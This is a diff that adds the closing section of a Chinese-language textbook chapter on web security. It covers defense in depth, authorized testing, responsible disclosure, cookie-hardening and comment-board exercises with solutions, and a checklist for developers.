+        但前提是你<strong>真的有用</strong>這些防護。這正好說明一件事:<strong>清單會變,原則不變。</strong>
+      </p>
+
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">縱深防禦,在 Web 的具體樣貌</span>
+          <p>回顧整章,你會發現同一個漏洞我們總是疊好幾層防:XSS 用「輸出編碼 + CSP + HttpOnly」;
+          CSRF 用「token + SameSite + 敏感操作再驗證」;注入用「參數化 + 輸入驗證 + 最小權限」;
+          傳輸用「HTTPS + HSTS + 杜絕混合內容」。這就是<strong>縱深防禦(defense in depth)</strong>在 Web 的實踐——
+          不假設任何單一防線不會失守,層層設防,一層破了還有下一層。這條心法(第 34、36 章)是貫穿整部資安的脊梁。</p>
+        </div>
+      </div>
+
+      <h2>安全開發與測試:授權前提下的攻防</h2>
+      <p>
+        漏洞防得再熟,人還是會錯。成熟的團隊把安全<strong>系統化</strong>地織進開發流程,而不是上線後出事才補。
+      </p>
+      <ul>
+        <li><strong>威脅建模(threat modeling):</strong>在<em>設計</em>階段就像攻擊者一樣思考——畫出資料流、標出
+        <strong>信任邊界</strong>、用 STRIDE 之類的方法逐項拷問「這裡會被誰、怎麼攻擊?」。改設計最便宜的時機,就是它還在白板上時(第 34 章)。</li>
+        <li><strong>滲透測試與漏洞掃描(授權前提):</strong>用 DAST 工具(OWASP ZAP、Burp Suite)對「執行中」的網站主動探測,
+        或請專業團隊做滲透測試。<strong>但這一切都必須在明確的書面授權範圍內進行。</strong>想動手練,
+        請用<strong>合法、自架</strong>的靶場——OWASP <strong>Juice Shop</strong>、<strong>DVWA</strong>、PortSwigger 的
+        <strong>Web Security Academy</strong> 都是專門讓你安全地實驗攻防的環境,絕不要對未授權的真實系統出手。</li>
+        <li><strong>把安全測試融入 CI:</strong>SAST(掃原始碼)、SCA(掃相依套件)、DAST(掃執行中應用)
+        應該像單元測試一樣自動跑在每次 commit/部署(第 18、36 章)。</li>
+      </ul>
+
+      <h3>Bug bounty 與負責任揭露</h3>
+      <p>
+        如果你<strong>無意間</strong>發現了某個別人網站的漏洞,正確的做法不是利用它、也不是公開炫耀,
+        而是<strong>負責任的揭露(responsible disclosure)</strong>:私下通知對方、清楚說明問題、給予合理的修補時間,
+        修好後再(在對方同意下)公開。許多公司還設有 <strong>bug bounty(漏洞賞金)</strong>計畫,
+        在明訂的規則與範圍內歡迎、甚至獎勵安全研究者回報漏洞——這把「找漏洞」變成一件<strong>合法且雙贏</strong>的事。
+        但務必看清楚計畫的<strong>範圍(scope)</strong>:超出授權範圍的探測,即使出於善意,依然可能違法。
+      </p>
+
+      <div class="callout danger">
+        <div class="ico">⛔</div>
+        <div class="body">
+          <span class="c-title">守住那條線</span>
+          <p>這一章教你看穿 Web 漏洞、理解攻擊。請牢牢記住:這些能力的<strong>正當用途只有兩個</strong>——
+          把你自己(與你受僱保護)的網站寫得更安全,以及在<strong>明確獲得授權</strong>的範圍內做安全測試。
+          未經授權去探測、攻擊任何不屬於你的網站,即使「只是看看」、即使沒造成損害,在絕大多數司法管轄區都是犯罪。
+          技術是中性的,讓它成為盾而非矛,是工程師的職業倫理底線。我們在<strong>第 41 章「計算倫理」</strong>會正式深入。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 52.4 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>你要為一個網路銀行設計「登入後」發給瀏覽器的 session cookie。請寫出你會用的完整
+          <code>Set-Cookie</code>(挑出該加的屬性),並逐一說明每個屬性<strong>擋掉哪一種攻擊</strong>。
+          另外說明:除了 cookie 屬性,你在「登入成功的那一刻」還會做哪一個關鍵動作?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-text">Set-Cookie: session=&lt;CSPRNG 產生的長隨機值&gt;; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900</code></pre>
+              <ul>
+                <li><strong>值用 CSPRNG 產生、夠長:</strong>不可預測,擋住「猜 session ID」與 session fixation 的可預測性。</li>
+                <li><strong><code>HttpOnly</code>:</strong>JavaScript 讀不到此 cookie,即使網站被 <strong>XSS</strong> 攻陷,腳本也偷不走 session。</li>
+                <li><strong><code>Secure</code>:</strong>只在 HTTPS 上傳送,擋住明文連線上的<strong>竊聽</strong>(session 劫持)。</li>
+                <li><strong><code>SameSite=Lax</code>(銀行可考慮 <code>Strict</code>):</strong>跨站請求不自動帶上此 cookie,擋住 <strong>CSRF</strong>。</li>
+                <li><strong><code>Path=/</code> 限定範圍、<code>Max-Age=900</code>(15 分鐘):</strong>縮短通行證有效窗口,降低被劫持後的濫用時間。</li>
+              </ul>
+              <p><strong>關鍵動作:登入成功的那一刻,重新產生 session ID</strong>(丟掉登入前的舊 ID、發一個全新的)——
+              這直接消滅 <strong>session fixation</strong>。最後,別忘了全站走 HTTPS、加上 HSTS,讓 <code>Secure</code> 真正有意義。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 52.5 <span class="badge">挑戰</span></div>
+        <div class="ex-body">
+          <p>有一個極簡的「留言板」:任何登入使用者可在表單填入留言並送出(<code>POST /comment</code>),
+          所有留言會顯示在公開頁面上,留言存進資料庫。請為這個小表單,從<strong>輸入到輸出、從前端到傳輸</strong>,
+          列出一套<strong>完整的縱深防禦</strong>措施,並標明每一條各防的是哪一類攻擊。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p>一個留言板麻雀雖小,五臟俱全,幾乎踩遍本章每個主題。一套縱深防禦可以是:</p>
+              <ol>
+                <li><strong>傳輸:</strong>全站 HTTPS + HSTS,杜絕混合內容。→ 擋竊聽 / MITM / 降級。</li>
+                <li><strong>輸入驗證(信任邊界、白名單):</strong>限制留言長度與允許字元、拒絕空白。→ 擋過大輸入、減少注入面。</li>
+                <li><strong>存入資料庫用參數化查詢。</strong>→ 擋 <strong>SQL 注入</strong>。</li>
+                <li><strong>輸出編碼:</strong>顯示留言時對 <code>&lt; &gt; &amp; " '</code> 做 HTML 編碼(用模板的自動編碼)。→ 擋<strong>儲存型 XSS</strong>。</li>
+                <li><strong>CSP:</strong><code>default-src 'self'</code>。→ 萬一漏了一個編碼,擋住注入腳本執行(XSS 第二層)。</li>
+                <li><strong>送出表單要帶 CSRF token,核對才處理;session cookie 設 <code>SameSite=Lax</code>。</strong>→ 擋 <strong>CSRF</strong>(防止別站偽造「代發留言」)。</li>
+                <li><strong>session cookie 設 <code>HttpOnly; Secure</code>。</strong>→ 即使被 XSS,也偷不走 session;只走 HTTPS。</li>
+                <li><strong>授權檢查:</strong>「刪除/編輯留言」要在伺服器端確認操作者是該留言作者(或管理員),不能只靠前端隱藏按鈕。→ 擋 <strong>IDOR / 越權</strong>。</li>
+                <li><strong>速率限制(rate limiting):</strong>限制每人每分鐘留言數。→ 擋洗版 / 濫用(可用性)。</li>
+                <li><strong>安全標頭 + 相依套件掃描 + 日誌監控。</strong>→ 設定面、供應鏈(A06)、被入侵的早期偵測(A09)。</li>
+              </ol>
+              <p>注意每一條都對應到本章一個段落,而且沒有任何單獨一條能「包辦全部」——這正是縱深防禦的本質:
+              一個功能、多層保護,任何一層失守,還有下一層接著。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>給開發者的 Web 安全檢查清單</h2>
+      <p>
+        把整章濃縮成一張可以在每次開發、每次 code review 時拿出來逐條問的清單:
+      </p>
+      <ul>
+        <li><strong>輸出一律編碼</strong>:任何使用者資料進 HTML/JS/URL 前先編碼;順著框架的自動編碼走,警惕 <code>innerHTML</code> / <code>dangerouslySetInnerHTML</code>。</li>
+        <li><strong>查詢一律參數化</strong>:SQL 用 prepared statement,命令用參數陣列、不經 shell;資料庫帳號最小權限。</li>
+        <li><strong>狀態變更防 CSRF</strong>:CSRF token + <code>SameSite</code> cookie;GET 只讀不改狀態;敏感操作再驗證密碼。</li>
+        <li><strong>每個敏感操作都做伺服器端授權檢查</strong>:確認「這個人能碰這筆資源/這個功能嗎」;絕不靠前端隱藏。</li>
+        <li><strong>cookie 鎖好</strong>:<code>HttpOnly; Secure; SameSite</code>;session ID 用 CSPRNG、登入時重新產生、設逾時。</li>
+        <li><strong>密碼安全儲存</strong>:bcrypt/scrypt/Argon2 加鹽慢雜湊;提供 MFA。</li>
+        <li><strong>全程 HTTPS</strong>:加 HSTS,杜絕混合內容,憑證有效。</li>
+        <li><strong>設好安全標頭</strong>:CSP、HSTS、X-Frame-Options、X-Content-Type-Options、Referrer-Policy。</li>
+        <li><strong>CORS 最小開放</strong>:只白名單信任來源,私密+帶憑證的 API 絕不用 <code>*</code>。</li>
+        <li><strong>驗證重新導向目標、限制 SSRF 的對外請求</strong>:跳轉只允站內;後端抓 URL 要白名單、擋內網。</li>
+        <li><strong>管好相依套件</strong>:持續掃描已知漏洞、鎖版本、定期更新、移除無用相依。</li>
+        <li><strong>錯誤訊息對外沉默、對內詳盡</strong>;關閉生產環境 debug;記錄與監控到位。</li>
+        <li><strong>安全織進流程</strong>:威脅建模、SAST/DAST/SCA 進 CI、code review 帶安全意識;測試只在授權範圍內。</li>
+      </ul>
+
+      <h2>把這一章串起來</h2>
+      <p>
+        我們從「瀏覽器甘願執行陌生程式碼」這個瘋狂又必要的前提出發,走過了 Web 攻防的全景。回顧路標:
+      </p>
+      <ul>
+        <li><strong>一切的基石是同源政策</strong>:它隔離不同來源,默默擋掉無數攻擊;<strong>CORS</strong> 是由伺服器主動授權、受控放寬的一扇門,而不是拆掉整道牆。</li>
+        <li><strong>XSS</strong>(反射/儲存/DOM)是「資料變腳本」:用<strong>輸出編碼 + CSP + HttpOnly</strong> 三層防。</li>
+        <li><strong>CSRF</strong> 借用你已登入的瀏覽器代發請求:用 <strong>CSRF token + <code>SameSite</code> cookie</strong> 擋它;<code>SameSite=Lax</code> 截斷了「跨站背景請求自動帶 cookie」這條命脈。</li>
+        <li><strong>注入</strong>(SQL/命令)在 Web 同樣致命:參數化 + 輸入驗證 + 最小權限。</li>
+        <li><strong>認證與工作階段</strong>:session 是通行證,要防劫持與固定;cookie 屬性鎖好;密碼加鹽慢雜湊;鼓勵 MFA。</li>
+        <li><strong>授權</strong>是 OWASP 第一名的洞:IDOR、越權、功能級存取缺失;每個敏感操作都要伺服器端檢查,<strong>「藏按鈕」不是安全</strong>。</li>
+        <li><strong>傳輸與其他</strong>:HTTPS/HSTS/憑證、杜絕混合內容;點擊劫持、開放重新導向、SSRF、安全標頭、供應鏈——各有對策。</li>
+        <li><strong>心法不變</strong>:縱深防禦、最小權限、安全預設、失敗時安全;把安全變成流程;以及那條不可逾越的<strong>倫理與授權</strong>界線。</li>
+      </ul>
+      <p>
+        Web 安全沒有「完成」的一天——攻擊手法會推陳出新,但你現在握有的,是比任何單一招式都珍貴的東西:
+        一雙能看穿「資料」與「指令」、「認證」與「授權」、「同源」與「跨站」界線的眼睛,
+        以及一顆「這裡的信任,放對了嗎?」的偵探之心。帶著它們,你寫的每一個網頁,都會比昨天更值得被信任一點。
+      </p>
+
+      <div class="callout note">
+        <div class="ico">📚</div>
+        <div class="body">
+          <span class="c-title">想更深入?延伸資源</span>
+          <p>本章對應 OSSU 的 <a href="https://www.coursera.org/learn/web-security-fundamentals">Web Security Fundamentals(KU Leuven,於 Coursera)</a>,
+          這門課把同源政策、XSS、CSRF、注入與安全標頭講得清晰又實務。最該收藏的兩份手冊是
+          <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 與
+          <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>(各類防禦的速查表)。
+          想系統性地、動手練攻防,<a href="https://portswigger.net/web-security">PortSwigger Web Security Academy</a>
+          是公認最好的免費互動教材,每個主題都附<strong>合法、自架</strong>的實驗靶場。再搭配
+          <a href="https://owasp.org/www-project-juice-shop/">OWASP Juice Shop</a> 之類的練習平台,
+          就能在不碰任何真實系統的前提下,安全地把這一章的每個漏洞親手玩過一遍。切記:絕不對未授權的系統出手。
+          注入與防禦性程式設計的完整版,在<strong>第 36 章</strong>;網路與 HTTP 的地基,在<strong>第 25 章</strong>;
+          密碼學與 TLS,在<strong>第 35 章</strong>。</p>
+        </div>
+      </div>
+
+          <div class="callout tip">
+        <div class="ico">🧭</div>
+        <div class="body">
+          <span class="c-title">延伸：專修軌道</span>
+          <p>想在授權靶機上動手攻防?<a href="71-ctf-web-network-forensics.html">第 71 章《Web 攻防、封包分析與檔案鑑識》</a>示範 SQLi/IDOR、封包分析與隱寫破解。</p>
+        </div>
+      </div>
+
+</article>
+  </main>
+</div>
+<script src="../assets/book.js"></script>
+</body>
+</html>
